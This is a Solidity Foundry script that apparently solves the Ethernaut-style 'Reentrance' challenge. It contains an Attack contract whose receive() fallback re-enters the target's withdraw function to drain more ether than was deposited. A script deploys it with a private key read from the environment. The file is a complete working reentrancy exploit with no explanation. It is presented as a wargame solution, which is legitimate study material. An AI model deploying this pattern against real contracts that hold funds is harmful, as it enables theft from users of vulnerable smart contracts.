// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Reentrance} from "src/Reentrance.sol";

contract Attack {
    Reentrance reentranceInstance = Reentrance(0x3DA2FfF0A76eC28561BD137a9459cbabfc40CF0D);

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentranceInstance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentranceInstance.withdraw(0.001 ether);
    }
}

contract ReentranceSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack{value: 0.001 ether}();
        attack.withdraw();
        vm.stopBroadcast();
    }
}
//0x2a24869323C0B13Dff24E196Ba072dC790D52479
